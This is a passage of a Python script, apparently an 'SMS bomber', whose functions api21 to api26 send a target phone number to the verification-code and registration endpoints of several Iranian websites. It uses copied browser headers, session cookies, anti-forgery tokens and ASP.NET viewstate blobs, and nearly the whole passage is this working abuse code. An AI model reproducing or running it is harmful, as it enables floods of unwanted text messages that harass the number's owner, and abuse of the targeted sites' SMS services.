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',
        '__VIEWSTATEGENERATOR': '5DD0000E',
        '__VIEWSTATEENCRYPTED': '',
        '__PREVIOUSPAGE': 'vhB16CE11rccvsNL6Hs4cQWgx0ubdkqA7HNZFnORS7qVHcHDEcv-5ePYKwU2GFAA4dD_cUgug8hfiPLSGMIqnf2mwby19sgdZIyM_BHgl6I1',
        '__EVENTVALIDATION': 'yLePS14lC4Jdp8O4HA0BxqxN8Zm5TYRFpRMd9hD2Uca/BcJUtD+j/lYvM6JcLzwrXksX8tkIWQkkqxJsXnLiA2xxHTYUTlb9rMZHbIDYQeeLjB9JVILiconUR/CyGJcYtstjDWo8jIbEGQChmKninvvuzClG6V6iJa5PicHVuIT8NJR4Xit3HeCi4YSBX+rB96Z7wJ5QnWjUaIsGB7faQdHjQb8adAZOqhnelOkTDEdmWfS/xwgI6H5/aI8wjSfA/OsIERULAvLJA32fVXjhp7p1+Oc1FHT5HRi72iSqpRo=',
        'ctl00$ContentPlaceHolder1$Textbox_mobile_number': number,
        'ctl00$ContentPlaceHolder1$Textbox_mobile_number2': '',
        'ctl00$TextBox_searchd': '',
        '__ASYNCPOST': 'true',
        'ctl00$ContentPlaceHolder1$Button_sendKod': '\u0627\u0631\u0633\u0627\u0644 \u06A9\u062F \u062A\u0627\u06CC\u06CC\u062F',
    }

    response = requests.post('https://digiyazd.com/logindigiyazd', headers=headers, cookies=cookies, data=data)


def api21(number):
    cookies = {
        '.AspNetCore.Antiforgery.mEZFPqlrlZ8': 'CfDJ8B0C_UCJaYdGshK0HoEGqhM8V8q7v7bY6c3XxvBLtIgrR4CZcBlCVQ-Ba4zpZy_P_m90b0sOUUhT76WCCUMPwx5QoBF7I5f_wMMBcwfM3oGgX2vGrfC7_GYx7sgo90AtnBNymRqTAGRhOZv8jgn_zCA',
    }

    headers = {
        'authority': 'ltms.gogoldis.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': '*/*',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryi6dMeESzJQd5SETM',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ltms.gogoldis.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://ltms.gogoldis.com/Account/Register',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': '.AspNetCore.Antiforgery.mEZFPqlrlZ8=CfDJ8B0C_UCJaYdGshK0HoEGqhM8V8q7v7bY6c3XxvBLtIgrR4CZcBlCVQ-Ba4zpZy_P_m90b0sOUUhT76WCCUMPwx5QoBF7I5f_wMMBcwfM3oGgX2vGrfC7_GYx7sgo90AtnBNymRqTAGRhOZv8jgn_zCA',
    }

    data = f'------WebKitFormBoundaryi6dMeESzJQd5SETM\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{number}\r\n------WebKitFormBoundaryi6dMeESzJQd5SETM--\r\n'

    response = requests.post('https://ltms.gogoldis.com/Account/CreateCode/', headers=headers, cookies=cookies,
                             data=data)


def api22(number):
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlwvTGFVWXM1NlltZ0FYbGZcL1RIeVc0UT09IiwidmFsdWUiOiJ0OFpOWDJ6SDFXTzZiUmV1dkhDK0h2QnZmOXREZ0dsUHFMaEZTN1BIaHhVWGlKVkcxa0xYSnhXUTJlcFZ0NmY3aDZGdFlqSERxOWhhME1mQ1wvaEE0MVV0MkpCMmtYeUh1NzUyZFpCRmNUZUVIM0wwZ2JPbkdRMVNYU2hLeGJxNSsiLCJtYWMiOiIxZjJlZTE5YTZhMDI2ZDA5ZDY4N2ZhODBlZDI1MjQyYWE5MzkwN2JkNzRmNGQyMjk1ZDU1ZDM3NjVmYWFiNDU3In0%3D',
        'asprt_rzro_session': 'eyJpdiI6ImkwRkhwUUxTZlZvRHBNNmxONmFheVE9PSIsInZhbHVlIjoiNm1nVFwvcW1VKytFdnhocnh6dlR1azltOVF0TXJJTGV5TW41U09pK0gxN1gyek9GOU5cLzdkZUVLSDhEekVDNzVyeGRrbkI0ditnTEdjWFwvMmN2YkIzOGdKMWpkQ2NTemREMDRBQ014Uko0eUR1OHNPR0w5TTROaGg0VkZyN0prdHciLCJtYWMiOiI1NWMxMzVhYzExNzAyNmJhNWUxMGZmMWEzYTViZGM5MjM5NjEyYWExMGE3NmNlNGIyN2E5ZGMzZDA2ZmUzOGIxIn0%3D',
        '_ga': 'GA1.2.1504731233.1648216723',
        '_gid': 'GA1.2.473055644.1648216723',
        '_gat_gtag_UA_60941647_4': '1',
    }

    headers = {
        'authority': 'sportreserve.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'x-xsrf-token': 'eyJpdiI6IlwvTGFVWXM1NlltZ0FYbGZcL1RIeVc0UT09IiwidmFsdWUiOiJ0OFpOWDJ6SDFXTzZiUmV1dkhDK0h2QnZmOXREZ0dsUHFMaEZTN1BIaHhVWGlKVkcxa0xYSnhXUTJlcFZ0NmY3aDZGdFlqSERxOWhhME1mQ1wvaEE0MVV0MkpCMmtYeUh1NzUyZFpCRmNUZUVIM0wwZ2JPbkdRMVNYU2hLeGJxNSsiLCJtYWMiOiIxZjJlZTE5YTZhMDI2ZDA5ZDY4N2ZhODBlZDI1MjQyYWE5MzkwN2JkNzRmNGQyMjk1ZDU1ZDM3NjVmYWFiNDU3In0=',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json, text/plain, */*',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://sportreserve.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sportreserve.ir/users/login-register',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlwvTGFVWXM1NlltZ0FYbGZcL1RIeVc0UT09IiwidmFsdWUiOiJ0OFpOWDJ6SDFXTzZiUmV1dkhDK0h2QnZmOXREZ0dsUHFMaEZTN1BIaHhVWGlKVkcxa0xYSnhXUTJlcFZ0NmY3aDZGdFlqSERxOWhhME1mQ1wvaEE0MVV0MkpCMmtYeUh1NzUyZFpCRmNUZUVIM0wwZ2JPbkdRMVNYU2hLeGJxNSsiLCJtYWMiOiIxZjJlZTE5YTZhMDI2ZDA5ZDY4N2ZhODBlZDI1MjQyYWE5MzkwN2JkNzRmNGQyMjk1ZDU1ZDM3NjVmYWFiNDU3In0%3D; asprt_rzro_session=eyJpdiI6ImkwRkhwUUxTZlZvRHBNNmxONmFheVE9PSIsInZhbHVlIjoiNm1nVFwvcW1VKytFdnhocnh6dlR1azltOVF0TXJJTGV5TW41U09pK0gxN1gyek9GOU5cLzdkZUVLSDhEekVDNzVyeGRrbkI0ditnTEdjWFwvMmN2YkIzOGdKMWpkQ2NTemREMDRBQ014Uko0eUR1OHNPR0w5TTROaGg0VkZyN0prdHciLCJtYWMiOiI1NWMxMzVhYzExNzAyNmJhNWUxMGZmMWEzYTViZGM5MjM5NjEyYWExMGE3NmNlNGIyN2E5ZGMzZDA2ZmUzOGIxIn0%3D; _ga=GA1.2.1504731233.1648216723; _gid=GA1.2.473055644.1648216723; _gat_gtag_UA_60941647_4=1',
    }

    data = {"mobile": number}

    response = requests.post('https://sportreserve.ir/mobile-submit', headers=headers, cookies=cookies, json=data)


def api23(number):
    cookies = {
        'PHPSESSID': '105129f5125cc9a3b71bbef675f350d8',
        '_ga_N70Q43GVP5': 'GS1.1.1648405162.1.0.1648405162.0',
        '_ga': 'GA1.2.59893184.1648405163',
        '_gid': 'GA1.2.1587994061.1648405164',
        '_gat_gtag_UA_218908397_1': '1',
    }

    headers = {
        'authority': 'safavie.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://safavie.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://safavie.ir/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'PHPSESSID=105129f5125cc9a3b71bbef675f350d8; _ga_N70Q43GVP5=GS1.1.1648405162.1.0.1648405162.0; _ga=GA1.2.59893184.1648405163; _gid=GA1.2.1587994061.1648405164; _gat_gtag_UA_218908397_1=1',
    }

    data = {
        'action': 'dom_register_phone',
        'phone': number,
    }

    response = requests.post('https://safavie.ir/wp-admin/admin-ajax.php', headers=headers, cookies=cookies, data=data)
    print(response.url)


def api24(number):
    cookies = {
        '__RequestVerificationToken': 'hgbvnICZgkEEOHUmZBxkQ-nvV8FSX-0bm-0chMHNpZY1aLTHyTPYGTT9zYpqN9unlvGWYxFKBHWRRzuRr_cJIr3VNyLwvzndDj1z3GdmKn81',
    }

    headers = {
        'authority': 'www.amukala.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://www.amukala.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://www.amukala.com/Account/Register',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': '__RequestVerificationToken=hgbvnICZgkEEOHUmZBxkQ-nvV8FSX-0bm-0chMHNpZY1aLTHyTPYGTT9zYpqN9unlvGWYxFKBHWRRzuRr_cJIr3VNyLwvzndDj1z3GdmKn81',
    }

    data = {
        '__RequestVerificationToken': '1R4hfZu6mFUzWp-L1yI9fqv0Y0BVE5ejLqaVnvNc2ELd9vwK0naRp9_ZaAaRRj_VZgJ-e9cmU4spThkVRCnFVWD6qt5CBqyN_nFI7nCINxs1',
        'username': number,
        'userRefId': '',
    }

    response = requests.post('https://www.amukala.com/Account/Register', headers=headers, cookies=cookies, data=data)
    print(response)


def api25(number):
    cookies = {
        'PrestaShop-aefcd009954c61a2e6692a93bc7d2807': 'b94dbd3c4f250bd20380e9399d29da0a4d43d7dd3ba9fe53973bdab38ed4c276%3AcAeSNi%2Fi1JI2JVU8pklr%2FVaAc7qt8BY7mwhbN162VWHbILdIaohcWQYZmITsAQjSptE%2B3qV8S6LdrvERK5q1ReJaZ2sY%2BSw4y%2B570QY8eM0%3D',
        'PHPSESSID': 'o5t1l9fd5h5n61u9ntpitneg26',
        '_ga': 'GA1.2.457028002.1648407668',
        '_gid': 'GA1.2.1569478233.1648407668',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '94961fe5-fa04-c813-fd15-6371d4c8d650',
        'analytics_session_token': 'd3e04295-e4c7-e341-5f9a-5fedab036be5',
        'yektanet_session_last_activity': '3/27/2022',
        '_yngt_iframe': '1',
        '__asc': '96a2be5f17fccc0e92a680e6944',
        '__auc': '96a2be5f17fccc0e92a680e6944',
        '_gat': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'crisp-client%2Fsession%2Fc5b57628-0a4d-47b5-9f85-67b8efae3e8d': 'session_9d47ea84-03f4-43b0-b65c-85fe98402033',
        'PrestaShop-b75825e74bb3d6ad54d8fea28596cea2': '3a06397bbbe0cfaaa19c52e5cf4a3a5c364cdbfd15421e643234707d895a3450%3AcAeSNi%2Fi1JI2JVU8pklr%2FcHUCH%2FvvPzxLRYty6263yiUQo67%2FGA5cHm69VrITM2sswgZ5ptlKxP35jnBSzYs0akz6n6I1st96NiwpZlvcowGtGVxTERoDDNUmWcRDoAqRx2fz2VUmKNBdyF2N0peGPqUVVUDcmxhNplFd%2B3az1LJR95kHiBBGelr3QKFhwAUofllM%2Bl2%2FW2cD9wcKiw%2FEg%3D%3D',
    }

    headers = {
        'authority': 'hyperbaz.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'cache-control': 'no-cache',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://hyperbaz.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://hyperbaz.com/my-account',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'PrestaShop-aefcd009954c61a2e6692a93bc7d2807=b94dbd3c4f250bd20380e9399d29da0a4d43d7dd3ba9fe53973bdab38ed4c276%3AcAeSNi%2Fi1JI2JVU8pklr%2FVaAc7qt8BY7mwhbN162VWHbILdIaohcWQYZmITsAQjSptE%2B3qV8S6LdrvERK5q1ReJaZ2sY%2BSw4y%2B570QY8eM0%3D; PHPSESSID=o5t1l9fd5h5n61u9ntpitneg26; _ga=GA1.2.457028002.1648407668; _gid=GA1.2.1569478233.1648407668; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=94961fe5-fa04-c813-fd15-6371d4c8d650; analytics_session_token=d3e04295-e4c7-e341-5f9a-5fedab036be5; yektanet_session_last_activity=3/27/2022; _yngt_iframe=1; __asc=96a2be5f17fccc0e92a680e6944; __auc=96a2be5f17fccc0e92a680e6944; _gat=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; crisp-client%2Fsession%2Fc5b57628-0a4d-47b5-9f85-67b8efae3e8d=session_9d47ea84-03f4-43b0-b65c-85fe98402033; PrestaShop-b75825e74bb3d6ad54d8fea28596cea2=3a06397bbbe0cfaaa19c52e5cf4a3a5c364cdbfd15421e643234707d895a3450%3AcAeSNi%2Fi1JI2JVU8pklr%2FcHUCH%2FvvPzxLRYty6263yiUQo67%2FGA5cHm69VrITM2sswgZ5ptlKxP35jnBSzYs0akz6n6I1st96NiwpZlvcowGtGVxTERoDDNUmWcRDoAqRx2fz2VUmKNBdyF2N0peGPqUVVUDcmxhNplFd%2B3az1LJR95kHiBBGelr3QKFhwAUofllM%2Bl2%2FW2cD9wcKiw%2FEg%3D%3D',
    }

    data = {
        'ajax': 'true',
        'action': 'verify_identity',
        'data': f'identity={number}',
        'request_uri': 'https://hyperbaz.com/my-account',
    }

    response = requests.post('https://hyperbaz.com/module/appsys3/smartlogin', headers=headers, cookies=cookies,
                             data=data)


def api26(number):
    cookies = {
        'ASP.NET_SessionId': 'nzvwc2bwxdatkkwgdtdvcatj',
        '_ga': 'GA1.2.1376453552.1648215203',
        '.ASPXANONYMOUS': 'mWoUk6B42AEkAAAANDhhMDQ0ZTUtZDliZi00ZDE1LTk0NjAtOWU5OWRiNGUyMTNla7bmOTmQJLXAz4wSbDOzgmLsUZ-Uwr566xLxSfqx1V01',
        '_gid': 'GA1.2.2090958042.1648408408',
        'crisp-client%2Fsession%2Fda900cf8-fe06-4013-8adc-4aceeda9b26b': 'session_b8f8de56-ffeb-4fda-87e7-1ae4eedf457d',
        '_gat': '1',
    }

    headers = {
        'authority': 'digiyazd.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cache-control': 'no-cache',
        'x-requested-with': 'XMLHttpRequest',
        'x-microsoftajax': 'Delta=true',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://digiyazd.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://digiyazd.com/logindigiyazd',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'ASP.NET_SessionId=nzvwc2bwxdatkkwgdtdvcatj; _ga=GA1.2.1376453552.1648215203; .ASPXANONYMOUS=mWoUk6B42AEkAAAANDhhMDQ0ZTUtZDliZi00ZDE1LTk0NjAtOWU5OWRiNGUyMTNla7bmOTmQJLXAz4wSbDOzgmLsUZ-Uwr566xLxSfqx1V01; _gid=GA1.2.2090958042.1648408408; crisp-client%2Fsession%2Fda900cf8-fe06-4013-8adc-4aceeda9b26b=session_b8f8de56-ffeb-4fda-87e7-1ae4eedf457d; _gat=1',
    }

    data = {
        'ctl00$ContentPlaceHolder1$ScriptManager1': 'ctl00$ContentPlaceHolder1$UpdatePanel1|ctl00$ContentPlaceHolder1$Button_sendKod',
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '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